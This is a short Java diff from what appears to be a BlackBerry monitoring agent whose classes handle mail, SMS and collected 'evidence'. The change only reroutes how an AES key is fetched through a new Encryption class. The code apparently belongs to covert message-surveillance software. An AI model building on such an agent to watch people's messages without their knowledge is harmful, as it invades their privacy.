@@ -27,6 +27,7 @@ import blackberry.agent.mail.MailListener;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -124,7 +125,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
         this(agentStatus);
 
         // mantiene la data prima di controllare tutte le email
-        markupDate = new TimestampMarkup(agentId, Keys.getInstance()
+        markupDate = new TimestampMarkup(agentId, Encryption.getKeys()
                 .getAesKey());
 
         parse(confParams);
